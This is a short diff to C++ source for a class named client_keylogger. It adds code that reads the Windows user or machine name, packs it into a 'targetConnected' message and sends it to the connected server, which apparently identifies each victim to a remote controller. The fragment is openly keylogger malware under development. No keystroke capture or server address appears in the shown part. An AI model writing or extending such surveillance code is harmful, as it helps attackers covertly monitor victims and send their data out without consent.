@@ -2,6 +2,7 @@
 #include "common.h"
 #include <thread>
 #include <chrono>
+#include "nameTaker.h"
 
 
 client_keylogger::client_keylogger(uint64_t(*scrambleFunc)(uint64_t))
@@ -48,7 +49,13 @@ void client_keylogger::connectInnit()
         }
     }
     kq::message<messageType> msg(messageType::targetConnected);
-
+    std::string name = windowsName();
+    for(auto c : name)
+    {
+        msg << char(c);
+    }
+    msg << uint32_t(name.size());
+    std::cout << "Sending name: " << name << "\n";
     Send(msg);
 
 }
